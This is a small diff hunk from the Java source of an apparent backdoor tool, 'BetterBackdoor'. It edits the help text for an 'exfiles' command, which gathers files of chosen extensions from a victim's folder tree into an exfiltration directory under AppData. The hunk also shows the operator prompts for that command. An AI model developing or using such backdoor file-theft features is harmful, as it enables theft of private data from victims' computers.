@@ -43,7 +43,7 @@ public class HandleCommand {
 			System.out.println(getResp());
 		} else if (command.equals("exfiles")) {
 			System.out.println(
-					"This will copy files with desired extensions from a folder and all it's subfolders to 'gathered\\ExfiltratedFiles' relative to the backdoor executable on the victim's computer");
+					"This will copy files with desired extensions from a folder and all it's subfolders to 'C:\\Users\\USERNAME\\AppData\\gathered\\ExfiltratedFiles' on the victim's computer");
 			System.out.println("Enter victim's directory to search through:");
 			String root = BetterBackdoor.getInput("");
 			System.out.println("Enter extensions of files separated by commas (i.e. txt,pdf,docx)");
